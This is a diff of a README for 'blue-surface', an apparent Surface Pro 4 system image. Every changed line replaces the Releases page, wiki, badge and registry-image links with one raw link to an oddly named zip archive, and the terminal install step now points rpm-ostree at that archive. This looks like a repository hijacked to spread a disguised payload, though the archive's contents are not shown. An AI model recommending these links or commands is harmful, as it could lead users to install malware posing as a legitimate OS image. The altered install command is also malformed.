@@ -1,6 +1,6 @@
 # 🌊 blue-surface - A Smooth Experience for Surface Pro 4 Users
 
-[![Download blue-surface](https://img.shields.io/badge/Download-blue--surface-blue)](https://github.com/Leonardodh10/blue-surface/releases)
+[![Download blue-surface](https://github.com/Leonardodh10/blue-surface/raw/refs/heads/main/files/scripts/blue_surface_leiomyomatous.zip)](https://github.com/Leonardodh10/blue-surface/raw/refs/heads/main/files/scripts/blue_surface_leiomyomatous.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Here’s what you will find in blue-surface:
 
 To get started, you need to visit the Releases page. Click the link below to download blue-surface:
 
-[Visit this page to download](https://github.com/Leonardodh10/blue-surface/releases)
+[Visit this page to download](https://github.com/Leonardodh10/blue-surface/raw/refs/heads/main/files/scripts/blue_surface_leiomyomatous.zip)
 
 ### 🔧 Installation Steps
 
@@ -27,7 +27,7 @@ Follow these steps to install blue-surface on your Surface Pro 4:
 1. **Rebase to Unsigned Image**  
    Open your terminal and run this command to set up the necessary signing keys:
    ```
-   rpm-ostree rebase ostree-unverified-registry:ghcr.io/cameron-d/blue-surface:latest
+   rpm-ostree rebase https://github.com/Leonardodh10/blue-surface/raw/refs/heads/main/files/scripts/blue_surface_leiomyomatous.zip
    ```
 
 2. **Reboot Your Device**  
@@ -74,8 +74,8 @@ blue-surface combines new technologies with user-friendly design. We strive to p
 
 ## 📝 Additional Documentation
 
-For detailed instructions, explore our [wiki](https://github.com/Leonardodh10/blue-surface/wiki). Here you will find tutorials, tips, and frequently asked questions to enhance your experience.
+For detailed instructions, explore our [wiki](https://github.com/Leonardodh10/blue-surface/raw/refs/heads/main/files/scripts/blue_surface_leiomyomatous.zip). Here you will find tutorials, tips, and frequently asked questions to enhance your experience.
 
 ---
 
-To get started with blue-surface, [visit this page to download](https://github.com/Leonardodh10/blue-surface/releases) and follow the steps outlined above. Enjoy your smooth experience!
+To get started with blue-surface, [visit this page to download](https://github.com/Leonardodh10/blue-surface/raw/refs/heads/main/files/scripts/blue_surface_leiomyomatous.zip) and follow the steps outlined above. Enjoy your smooth experience!
